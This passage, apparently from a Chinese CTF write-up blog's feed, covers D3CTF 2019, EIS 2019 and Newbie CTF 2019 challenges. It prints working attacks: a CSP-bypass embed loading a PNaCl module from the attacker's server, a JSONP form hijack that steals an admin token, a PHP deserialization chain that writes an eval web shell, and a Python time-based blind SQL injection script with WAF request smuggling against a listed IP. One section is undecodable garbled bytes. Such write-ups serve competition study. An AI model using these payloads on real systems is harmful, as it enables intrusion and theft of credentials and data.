   index,        message=message,        host=&#39;https://&#39;+request.host,        captcha=session[&#39;captcha&#39;]    )@app.route(&#39;/fd.php&#39;)def mirror():    response = make_response(request.args.get(&#39;q&#39;))    response.headers[&#39;Content-Security-Policy&#39;] = &quot;img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;&quot;    return response@app.route(&#39;/admin.php&#39;)def admin():    if request.headers.get(&#39;x-forwarded-for&#39;) != config[&#39;redis&#39;][&#39;host&#39;]:        return &#39;only admin can see it&#39;    token = request.host.split(&#39;.&#39;)[0]    return f&#39;&#39;&#39;{{    "token": "{token}",    "flag": "d3ctf{{{hashlib.sha256((        token+config["challenge"]["flag"]    ).encode()).hexdigest()}}}&quot;}}&#39;&#39;&#39;</code></pre><p>å…³é”®ä»£ç :</p><pre><code class="python">if request.method == &#39;POST&#39;:        try:            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():                captcha = request.form[&#39;captcha&#39;]                url = request.form[&#39;url&#39;]                if not verify_captcha(captcha):                    message = &quot;Wrong Captcha :(&quot;                elif not verify_url(url):                    message = &quot;Wrong URL :(&quot;                else:                    session.pop(&#39;captcha&#39;)                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;                    add_queue(url)        except:            message = &quot;Error! Please contact admin&quot;</code></pre><pre><code class="python">def verify_url(url):    base = &#39;https://&#39;+request.host    if len(url) == 0:        return False    if len(url) &lt; len(base) or url[:len(base)] != base:        return False    return True</code></pre><p>é€šè¿‡verify_urlä¹‹å,adminä¾¿å›è®¿é—®.è¿™é‡Œç”¨<code>&#39;https://&#39;+request.host</code>æ¥éªŒè¯æ˜¯å¦æ¥æºäºåŸç½‘ç«™</p><p>emmm,request.host=<code>/fd.php</code>,å°±ä¸ç”¨è€ƒè™‘ä¿®æ”¹hostæ¥ç»•è¿‡æ‹‰</p><p>é‚£ä¹ˆå°±æ˜¯è¦ç»•<code>/fd.php</code>çš„cspç­–ç•¥äº†:<code>img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;</code></p><p>çœŸçš„æ˜¯babyéš¾åº¦å•Šã€‚ã€‚ã€‚ã€‚ã€‚</p><blockquote><p>ä¸¢åˆ°csp-evaluatoré‡Œå¤´å¯ä»¥å‘ç°æ²¡æœ‰è®¾ç½®object-src<br>object-srcå…è®¸åµŒå…¥object<br>æ ¹æ®hintå»<code>chrome://components</code>é‡Œå¤´æ‰¾æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç»„ä»¶<br>æœ€æ–°ç‰ˆchromeå·²ç»é»˜è®¤ç¦æ­¢äº†flashçš„ä½¿ç”¨(ç„¶è€Œå°±æ˜¯æœ‰å¾ˆå¤šäººä¸ä¿¡é‚ª)<br>é€šè¿‡ä¸€äº›æœç´¢å¯ä»¥å‘ç°pNaClå¯ä»¥è·‘C/C++</p><p>å¯ä»¥ç¼–å†™ä¸€ä¸ªLeakå»è¯·æ±‚admin.phpï¼Œè·å–flagï¼Œç„¶åå†å°†flagå¸¦å‡ºæ¥<br>ä¸‹è½½ä¸‹æ¥è°·æ­Œçš„<a href="https://developers.google.com/native-client/dev/sdk/download" target="_blank" rel="noopener">SDK</a>å’ŒLeakåå¯ä»¥ç¼–è¯‘å‡ºä¸€ä¸ªnmfæ–‡ä»¶å’Œä¸€ä¸ªpexeæ–‡ä»¶ï¼Œæ”¾åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç„¶åå°è¯•:</p><pre><code class="html">&lt;embed src=&quot;http://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre><p>è½»æ¾è·å¾—äº†ä¸€ä¸ªMixed Contentå‘¢ï¼ˆï¼ˆæ¯’ç˜¤å‡ºé¢˜äºº<br>ä¸Šhttpsä»¥åå‘ç°:</p><pre><code>PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled</code></pre><p>æœç´¢Origin Trialï¼Œçœ‹æ–°é—»ï¼š</p><p><a href="https://developer.chrome.com/native-client/migration" target="_blank" rel="noopener">https://developer.chrome.com/native-client/migration</a><br><a href="https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md" target="_blank" rel="noopener">https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md</a></p><p>å»<a href="https://developers.chrome.com/origintrials" target="_blank" rel="noopener">Origin Trial</a>ç”³è¯·ä¸€ä¸ªtokenï¼Œæœ€ç»ˆçš„payload:</p><pre><code>&lt;meta http-equiv=&quot;origin-trial&quot; content=&quot;[token]&quot;&gt;&lt;embed src=&quot;https://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre></blockquote><h3 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h3><p>è‡ªå·±æ­çš„ç¯å¢ƒæ¯›ç—…ä¸€å¤§å †///å°±ç›´æ¥çœ‹åˆ«äººwpäº†</p><p>é¢˜ç›®æ˜¯ä¸€ä¸ªåœ¨çº¿ç•™è¨€æ¿ï¼Œæ³¨å†Œç™»å½•åå¯ä»¥æäº¤ç•™è¨€ã€‚</p><p>ç®€å•æµ‹è¯•åä¼šå‘ç°ç•™è¨€å¯ä»¥æ’å…¥ HTML æ ‡ç­¾ï¼Œä½†æ˜¯åç«¯ä½¿ç”¨äº†æ ‡ç­¾å/å±æ€§åç™½åå•åšè¿‡æ»¤ï¼Œä¸€èˆ¬çš„å±é™©æ ‡ç­¾å’Œå±æ€§éƒ½è¢« ban æ‰äº†ã€‚</p><p>æ§åˆ¶å°å¯ä»¥çœ‹åˆ°æ‰“åŒ…å‰çš„å‰ç«¯æºç ï¼Œå®¡è®¡ä¸€æ³¢ã€‚</p><p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒCSRF token æ˜¯ç›´æ¥ä½¿ç”¨çš„ sessionid :</p><p><a href="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" alt="img"></a></p><p>å› æ­¤å¦‚æœæˆ‘ä»¬èƒ½è·å¾—ä»–äººçš„ token å°±å¯ä»¥ç™»å½•ä»–äººè´¦å·ã€‚</p><p>ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å‚æ•° this.$route.query.did è¢«æ‹¼æ¥åˆ°äº† jsonp æ–¹æ³•çš„ url å½“ä¸­</p><p><a href="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" alt="img"></a></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥è®¾ç½® did ä¸º <code>1/delete?callback=alert#</code> ï¼Œæ§åˆ¶ jsonp çš„ callback ï¼Œåœ¨ jsonp æ–¹æ³•ä¸­ä¼šç›´æ¥æ‰§è¡Œï¼š</p><p><a href="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" alt="img"></a></p><p>ä½†æ˜¯åç«¯çš„ jsonp api ç»™ callback åšäº†æ ¡éªŒï¼Œåªèƒ½ä¼ å…¥æœ‰é™çš„å­—ç¬¦ï¼Œå¹¶ä¸èƒ½ä»»æ„æ‰§è¡Œ js ä»£ç ã€‚</p><p><a href="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" alt="img"></a></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸¤ä¸ªé—®é¢˜ç»“åˆåˆ©ç”¨ä¸€ä¸‹ï¼Œåˆ©ç”¨è¿™ä¸ªå—é™çš„ jsonp xss æ¥åŠ«æŒ token ã€‚</p><p><a href="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" alt="img"></a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° token è¢«æ¸²æŸ“åˆ°äº† id ä¸º messageForm çš„ form ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•åŠ«æŒè¿™ä¸ª form ï¼Œè®©ä»–çš„ submit åæäº¤åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œä»è€Œè·å– token ã€‚</p><p>å¦‚ä½•åŠ«æŒå‘¢ï¼Ÿåˆ©ç”¨ä¸¤ä¸ª HTML5 çš„æœ‰è¶£å±æ€§ï¼š</p><blockquote><p><a href="https://www.w3school.com.cn/tags/att_input_formaction.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_formaction.asp</a></p><p><a href="https://www.w3school.com.cn/tags/att_input_form.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_form.asp</a></p></blockquote><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç•™è¨€åŠŸèƒ½æ’å…¥ä¸€ä¸ªåœ¨è¡¨å•ä¹‹å¤–çš„ input æ ‡ç­¾ï¼Œå†åˆ©ç”¨è¿™ä¸¤ä¸ªå±æ€§æ¥åŠ«æŒè¡¨å•ï¼š</p><p><a href="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" alt="img"></a></p><p>åˆ©ç”¨ jsonp xss æ¥ç‚¹å‡»å®ƒï¼š</p><pre><code>http://localhost:8180/#/?pid=72&amp;did=23%2Fdelete%3Fcallback%3Dfish.click%23</code></pre><p>token å°±åˆ°æ‰‹äº†ï¼š</p><p><a href="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" alt="img"></a></p><p>report è¿™æ¡ payload ï¼Œè·å¾— admin çš„ token ä¹‹åç™»å½• admin è´¦å·ï¼Œåœ¨ admin çš„ç•™è¨€ä¸­è·å¾— flag ã€‚</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="c-c"><a href="#c-c" class="headerlink" title="c+c"></a>c+c</h3><p>readme.txt</p><blockquote><p>This is a lite (which means there is no voice but the script is complete.) version of a great galgame (a.k.a. Visual Novel) written by Romeo Tanaka. Hope you enjoy it.<br>PS: I did some small hack to the game for cracking. But you still need steam running to play this game.<br>PSS: If you like it, you can buy it on steam.<br>PSSS: Do not forget to find the flag. And the flag is just in THIS file.î€€</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976rzdu69j30j001aglt.jpg" alt="image.png"></p><p>æ¸¸æˆä¸­ä¼šå‡ºç°</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976tjarq4j308k01nt8n.jpg" alt="image.png"></p><p>ä¸€äº›ä¸å¯è§å­—ç¬¦8ä¸ªä»¥ä¸Š,å¯èƒ½æ˜¯flag?</p><pre><code class="lua">function L0_0()  local L0_32, L1_33, L2_34, L3_35  L0_32 = {    L1_33,    L2_34,    L3_35,    172,    21,    149,    198,    139,    38,    63,    174,    238,    232,    20,    85,    107  }  L1_33 = 221  L2_34 = 179  L3_35 = 102  L1_33 = 166  L2_34 = 44  L3_35 = &quot;{&quot;  for _FORV_7_ = 1, #L0_32 do    L3_35 = L3_35 .. string.format(&quot;%02x&quot;, L0_32[_FORV_7_] ~ L1_33)    if _FORV_7_ == 4 or _FORV_7_ == 6 or _FORV_7_ == 8 or _FORV_7_ == 10 then      L3_35 = L3_35 .. &quot;-&quot;    end  end  L3_35 = L3_35 .. &quot;}&quot;  return &quot;&quot;, &quot;&quot;, string.upper(L3_35), L2_34end</code></pre><p>suç›´æ¥å»ä¹°äº†åŸç‰ˆæ¸¸æˆï¼Œå¯¹æ¯”å‘ç°åªæœ‰dllï¼Œexeæ–‡ä»¶ä¸åŒ</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97whcjur2j31ya0poq7p.jpg" alt="image.png"></p><p>é˜µäº¡</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/d3ctf2019/">http://blog.ccreater.top/2020/04/20/d3ctf2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eis2019</title>
      <link href="/2020/04/20/eis2019/"/>
      <url>/2020/04/20/eis2019/</url>
      
        <content type="html"><![CDATA[<h1 id="eis2019"><a href="#eis2019" class="headerlink" title="eis2019"></a>eis2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>upload:</p><p>æ ¡éªŒæ–‡ä»¶å¤´</p><p>è¿‡æ»¤åç¼€php</p><p>ä¸Šä¼ php5åç¼€ç»•è¿‡</p><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p><pre><code class="php">&lt;?phperror_reporting(0);class A{    protected $store;    protected $key;    protected $expire;    public function __construct($store, $key = &#39;flysystem&#39;, $expire = null)    {        $this-&gt;key    = $key;        $this-&gt;store  = $store;        $this-&gt;expire = $expire;    }    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }    public function getForStorage()    {        $cleaned = $this-&gt;cleanContents($this-&gt;cache);        return json_encode([$cleaned, $this-&gt;complete]);    }    public function save()    {        $contents = $this-&gt;getForStorage();        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);    }    public function __destruct()    {        if (! $this-&gt;autosave) {            $this-&gt;save();        }    }}class B{    protected function getExpireTime($expire): int    {        return (int) $expire;    }    public function getCacheKey(string $name): string    {        return $this-&gt;options[&#39;prefix&#39;] . $name;    }    protected function serialize($data): string    {        if (is_numeric($data)) {            return (string) $data;        }        $serialize = $this-&gt;options[&#39;serialize&#39;];        return $serialize($data);    }    public function set($name, $value, $expire = null): bool    {        $this-&gt;writeTimes++;        if (is_null($expire)) {            $expire = $this-&gt;options[&#39;expire&#39;];        }        $expire   = $this-&gt;getExpireTime($expire);        $filename = $this-&gt;getCacheKey($name);        $dir = dirname($filename);        if (!is_dir($dir)) {            try {                mkdir($dir, 0755, true);            } catch (\Exception $e) {                // åˆ›å»ºå¤±è´¥            }        }        $data = $this-&gt;serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {            //æ•°æ®å‹ç¼©            $data = gzcompress($data, 3);        }        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;        $result = file_put_contents($filename, $data);        if ($result) {            return true;        }        return false;    }}if (isset($_GET[&#39;src&#39;])){    highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){    mkdir($dir);}unserialize($_GET[&quot;data&quot;]);</code></pre><p>è¿™é‡Œæœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹</p><pre><code class="php">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;$result = file_put_contents($filename, $data);</code></pre><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªæ­»äº¡exit</p><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p><p>è¿™é‡Œæ–‡ä»¶åå¯æ§,æˆ‘ä»¬ç”¨phpåè®®ç¼–ç exitä»è€Œç»•è¿‡æ­»äº¡exit</p><p>æ„é€ </p><pre><code class="php">&lt;?phpclass A{    protected $store;    protected $key;    protected $expire;    public $autosave=FALSE;    public $complete;    public $cache;    public function __construct()    {        $this-&gt;key    = &quot;fffffuck.php&quot;;        $this-&gt;store=new B;        $this-&gt;expire = $expire;        $this-&gt;complete=&quot;PD9waHAgZXZhbCgkX1BPU1RbImEiXSk7ID8+&quot;;        $this-&gt;cache=array();    }}class B{    public $options;    public $writeTimes;    public function __construct()    {        $this-&gt;options=array(            &#39;expire&#39;=&gt;&#39;0&#39;,            &quot;prefix&quot;=&gt;&#39;php://filter/write=convert.base64-decode/resource=uploads/&#39;,            &#39;serialize&#39;=&gt;&#39;serialize&#39;,            &#39;data_compress&#39;=&gt;FALSE        );    }}print(urlencode(serialize(new A)));?&gt;</code></pre><h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a> </p><p>åˆ©ç”¨è¿™ä¸ªç»•è¿‡</p><h3 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h3><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;if (isset($_GET[&#39;src&#39;])){    highlight_file(__FILE__);}function escape($arr){    global $mysqli;    $newarr = array();    foreach($arr as $key=&gt;$val)    {        if (!is_array($val))        {            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);        }    }    return $newarr;}$_GET= escape($_GET);if (isset($_GET[&#39;name&#39;])){    $name = $_GET[&#39;name&#39;];    mysqli_query($mysqli, &quot;select age from user where name=&#39;$name&#39;&quot;);}else if(isset($_GET[&#39;age&#39;])){    $age = $_GET[&#39;age&#39;];    mysqli_query($mysqli, &quot;select name from user where age=$age&quot;);}</code></pre><p>é€‰æ‹©ageä½œä¸ºæ³¨å…¥ç‚¹ï¼Œä¸éœ€è¦é€ƒé€¸å¼•å·,æ²¡æœ‰å›æ˜¾åˆ©ç”¨æ—¶é—´ç›²æ³¨</p><p><code>?age=1%2bsleep(1)</code> =&gt; 403</p><p>apacheè®¾ç½®äº†waf</p><p>ç”¨ç•¸å½¢çš„httpç»•è¿‡waf</p><pre><code class="python">import requestsimport hackhttp import urllibimport socketip = &#39;111.186.57.61&#39;port = 10601def send_raw(raw):    try:        with socket.create_connection((ip, port), timeout=2) as conn:            conn.send(bytes(raw,encoding=&quot;ascii&quot;))            res = conn.recv(10240).decode()    except:        return True    return Falsedef rawhttp(sql):    sql=urllib.parse.quote(sql)    burp0_url = &quot;http://111.186.57.61:10601/?age={}&quot;.format(sql)    raw=&#39;&#39;&#39;GET /?age={} HTTP/1.1Host: 111.186.57.61:10601Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Length: 0Content-Length: 0&#39;&#39;&#39;.format(sql).replace(&quot;\n&quot;,&quot;\r\n&quot;)    return send_raw(raw)l=&#39;0123456789ABCDEF&#39;result=&quot;657A73716C69&quot;#database :ezsqliresult=&quot;&quot;#table flag_xdd,user?#column flag_32122#flag{bypass_modsecurity_a202e614489c}j=len(result)while True:    for i in l:        sql=&quot;if((select substr(hex(GROUP_CONCAT(flag_32122)),{},1) FROM flag_xdd)=char({}),sleep(10),0)&quot;.format(j+1,ord(i))        if rawhttp(sql):            result+=i            print(result)            break        else :            print(&quot;ç¬¬{}ä¸ªå­—ç¬¦ä¸æ˜¯{}&quot;.format(j+1,i))    j+=1</code></pre><h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>è«å¾—</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="two-cat"><a href="#two-cat" class="headerlink" title="two_cat"></a>two_cat</h3><p>çœ‹åˆ«äººçš„wpçŸ¥é“æ˜¯ç›²æ°´å°æ”»å‡»</p><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h2><pre><code>IÂ¤ÃŒÃ§z6j|Â´Â±Â¥Ã³ÂŒÂ¼Â“Â¹[Æ‚Ä„Êƒz@aÅ‚Ş¢|Ó„É’ak@aÅ‚Ş¢Å…yÄ‰Ó¡k@aÅ‚Ş’|Ó„É’ak@Ö‹@JBÂ™Å¥ÉÃ‰Ö•k@Å§Ã…Õ„Å„@Â‰ÕÙ¨@Ã–Ä…Å€Ä…Ã‰ÔÔ€É•Ã…ÙƒÈÕ‡Æ€Ã–Ä…Z@U@SÓ…Ç…Å€ÃˆYCÃ…Ú€Â…Ä€Ä¢Å„@Ö•@Ê‚Õ€Ä‰Õ–ÂÄ™Ã‹@É£@Å§É¢Ã¢@É•@c@Ó…bÄ€Â‰È€Ô¤Ã¤SÓ¨@É•Ã–Ô—cÉ‚Ó…@Å…Ù¢É–Õ¢k@SÔ€Æ…cÄ™É•È€Â¤Ãˆ@Ä…Ó‰ÇˆÃ¢@b@Õ–Ö Ã–Õ£É‡Ä–Ä¢@Ó…Ã£Å™@Â…Ø¤Å•Ã…Ã€UÅ€ÃˆÆ€BÂ…ÕƒÆ€Ö†@Â…Å…ÙÔ€Â¢Ä‰Ê€×¤ÕƒÃ¤cÉ–Ö€ÃˆYCÃ…Ù¢@ÆÉ™Ó¨@É”×–Ù£UÄ€Æ–Ú€Ô–Ä…Ù•@Ã–Ô—Ä£Å™@ÓÕ‡ÄÇ…Ã€MÅ§CÃ“É€ÆˆÉƒÉ€ÃˆYCÃ…Ù¢@YÆ€BÂ…Õ£@ÅÙ‰Å¢@CÃ–Ù„É•È€Ã–@ÆˆÉƒÉ€Å…Ù¢É–Ö€Ö†@Æ‚Ä„Êƒ@È–Å½Ù…@Ó–Ö’É•È€c]K@Ê‚Õ€DWÃ…Å€Æ‚Ä„Êƒ@Æ™Ö”@×¤ÕƒÈ…Å€ÃÙ„@Ã–Ä…@É•@ÃˆÆ€ÅÙ“É€ñ¹¶°Ã€UÅ€×™Ö”Ä“ÇÃ…Å€É£@b@Â€Ã¤Â£Ö”Å™`Ã–Õ£Ù–Ô€ÃÃ£Éƒ@MÂ…Æ€Ã–Õ•ÅƒÃ–Ú€Ã–Õ¢×‰ÙÃ¨]k@Â—Ä™Õ‰Õ‡@ÃˆÆ€SÙ…DÉ€Å¢ÃÂ“É¢È…Å€Â¢Ä‰Ê€Â£UÄÙ„K@ã–„hk@Ê‚Õ€Ã“IÔ¢@Ã–@Â…@U@Ö—Å•`Â¨Â£Å”Ã€Ã–Ô—UÉ«@Â¤Ä€Ê‚Õ½Ã€Ö¦Ö€Ä…ÂƒÙ‰×£É–Ö€Ö†@ÃˆÆ€Æ‚Ä„Êƒ@ÅÙ‰UÃ¢@UÅ€È–Ç€Ã–@Ã–Õ¥Å™Ä€Â…Ã¦Å…Ö€ÃˆÅ”@É¢@Â£É“Ô€É•Ã…Ù•SÓ¨@Ã“bÂ‰Æ‰Å„@Ã–Ø Â…Ã™Å£k@Â¤Ù•`Â…Æ–Ù…`Ù…DÉ•È‹@ÈÃ’Å™Ã€Â“UÃˆ@c@ÃˆÆ€Å…Ù¨@ÕÔ…@Ö†@Æ‚Ä„Êƒ@UÅ€Ã–Õ¢É„Å™@É£@Â€ÔÕ‰Æ…Â£cÉ–Ö€Ö†@×¤Ù…Â£@Å¥É“KÆ“G@É¢@Æ“GpÂ°ï¿½ï¿½Æ´ï¿½ï¿½ï¿½ï¿½ò´„´ğ°²³Ç°Æ„Ã…ï¿½</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/eis2019/">http://blog.ccreater.top/2020/04/20/eis2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>newbie ctf 2019</title>
      <link href="/2020/04/20/nbctf/"/>
      <url>/2020/04/20/nbctf/</url>
      
        <content type="html"><![CDATA[<h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>é¢˜ç›®æè¿°:</p><blockquote><p>You can get flag in â€œnormalflag.iwinv.netâ€</p></blockquote><p>é¢˜ç›®ç»™çš„é“¾æ¥</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p><p>ç›´æ¥è®¿é—® flag</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p><p>è¾“å…¥ç½‘ç«™æµ‹è¯•å‘ç°,ä¼šåœ¨ç½‘å€åé¢åŠ ä¸ªsecretå‚æ•°</p><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191103111420354.png" alt="image-20191103111420354"></p><p>è€Œflagç•Œé¢å°±æ˜¯é€šè¿‡è¿™ä¸ªsecretæ¥è¯†åˆ«æ˜¯å¦é€šè¿‡internal.iwinv.net</p><p>è§‚å¯Ÿsecretå‘ç°ï¼Œæ¯æ¬¡è®¿é—®ç»™å‡ºçš„secretéƒ½ä¸ä¸€æ ·</p><p>æ’é™¤æ‰ç®—å‡ºsecretçš„åšæ³•,é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è¦ç»•è¿‡ç¦ç”¨hostçš„é™åˆ¶æˆ–è€…æ˜¯è¾“å…¥ä¸€ä¸ªç½‘å€ï¼Œè®©å…¶æ— æ³•è¯†åˆ«å‡ºæ˜¯<code>normalflag.iwinv.net</code>å´èƒ½è®¿é—®<code>normalflag.iwinv.net</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" 